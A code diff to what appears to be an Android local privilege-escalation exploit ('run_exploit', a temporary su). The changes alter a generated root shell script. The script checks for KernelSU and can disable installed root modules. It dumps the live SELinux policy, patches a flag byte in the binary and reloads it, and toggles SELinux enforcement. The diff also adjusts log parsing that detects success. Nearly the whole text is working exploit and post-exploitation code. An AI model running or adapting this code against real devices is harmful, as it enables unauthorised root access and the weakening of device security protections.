@@ -498,7 +498,7 @@ static void init_runtime_paths(void) {
 }
 
 static void write_root_script(void) {
-  char script[4096];
+  char script[8192];
   int sfd = open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
   if (sfd < 0) {
     pr_warning("open root script failed path=%s errno=%d\n",
@@ -535,6 +535,13 @@ static void write_root_script(void) {
       "if [ \"$(id -u)\" -ne 0 ]; then\n"
       "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
       "  exit 1\n"
+       "fi\n"
+       "if grep -q '^kernelsu[[:space:]]' /proc/modules 2>/dev/null; then\n"
+       "  echo \"[*] kernelsu already loaded; skipping policy restore and late-load\" >>\"$LOG\"\n"
+       "  echo '[+] KernelSU already loaded' >>\"$LOG\"\n"
+       "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+       "  echo \"[*] restored SELinux enforcing\" >>\"$LOG\"\n"
+       "  exit 0\n"
       "fi\n"
       "KVER=$(uname -r | cut -d. -f1-2)\n"
       "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
@@ -543,11 +550,46 @@ static void write_root_script(void) {
       "  exit 1\n"
       "fi\n"
       "KMI=\"${AVER}-${KVER}\"\n"
-      "# step 1: restore policy (W1 already made permissive)\n"
+      "# safe mode: disable all modules before exec ksud\n"
+      "if [ \"$GHOSTLOCK_DISABLE_MODULES\" = \"1\" ]; then\n"
+      "  echo \"[*] safe mode: disabling all modules under /data/adb/modules\" >>\"$LOG\"\n"
+      "  n=0\n"
+      "  for m in /data/adb/modules/*/; do\n"
+      "    [ -d \"$m\" ] || continue\n"
+      "    if touch \"${m}disable\" 2>/dev/null; then\n"
+      "      n=$((n+1))\n"
+      "      echo \"  disabled ${m}\" >>\"$LOG\"\n"
+      "    fi\n"
+      "  done\n"
+      "  echo \"[*] safe mode: $n module(s) disabled\" >>\"$LOG\"\n"
+      "fi\n"
+      "# step 1: restore policy\n"
+      "POLICY=$(mktemp \"$HOME_DIR/.ghostlock_policy.XXXXXX\") || {\n"
+      "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
+      "  exit 1\n"
+      "}\n"
+      "trap 'rm -f \"$POLICY\"' EXIT\n"
+      "prepare_policy() {\n"
+      "  cat /sys/fs/selinux/policy >\"$POLICY\" || return 1\n"
+      "  HEADER=$(od -An -tx1 -N24 \"$POLICY\" | tr -d ' \\n')\n"
+      "  case \"$HEADER\" in\n"
+      "    8cff7cf9080000005345204c696e7578????????????????) ;;\n"
+      "    *) echo '[!] invalid policy header'; return 1 ;;\n"
+      "  esac\n"
+      "  # Restore missing Android netlink flags: bits 30/31, byte 23.\n"
+      "  CONFIG=$(od -An -tu1 -j23 -N1 \"$POLICY\") || return 1\n"
+      "  [ -n \"$CONFIG\" ] || return 1\n"
+      "  CONFIG=$(printf '\\\\0%%03o' \"$((CONFIG | 192))\") || return 1\n"
+      "  printf '%%b' \"$CONFIG\" | dd of=\"$POLICY\" bs=1 seek=23 count=1 conv=notrunc\n"
+      "}\n"
       "FIXUP_RC=1\n"
       "for i in $(seq 1 10); do\n"
       "  echo \"[*] fixup: attempt $i\" >>\"$LOG\"\n"
-      "  load_policy /sys/fs/selinux/policy >>\"$LOG\" 2>&1 &\n"
+      "  if ! prepare_policy >>\"$LOG\" 2>&1; then\n"
+      "    sleep 2\n"
+      "    continue\n"
+      "  fi\n"
+      "  load_policy \"$POLICY\" >>\"$LOG\" 2>&1 &\n"
       "  LPID=$!\n"
       "  (sleep 8; kill -9 $LPID 2>/dev/null) &\n"
       "  SPID=$!\n"
@@ -952,6 +994,7 @@ int run_exploit(int argc, char **argv) {
   set_unbuffer();
   signal(SIGPIPE, SIG_IGN);
   set_limit();
+  reserve_standard_io();
   init_cpu_config();
   init_runtime_paths();
   write_root_script();
@@ -1220,7 +1263,9 @@ int run_exploit(int argc, char **argv) {
     if (lf) {
       char line[256];
       while (fgets(line, sizeof(line), lf)) {
-        if (strstr(line, "[+] KernelSU module loaded")) ksu_log_loaded = 1;
+        if (strstr(line, "[+] KernelSU module loaded") ||
+            strstr(line, "[+] KernelSU already loaded"))
+          ksu_log_loaded = 1;
         if (strstr(line, "[!] KernelSU module not loaded")) ksu_log_failed = 1;
       }
       fclose(lf);
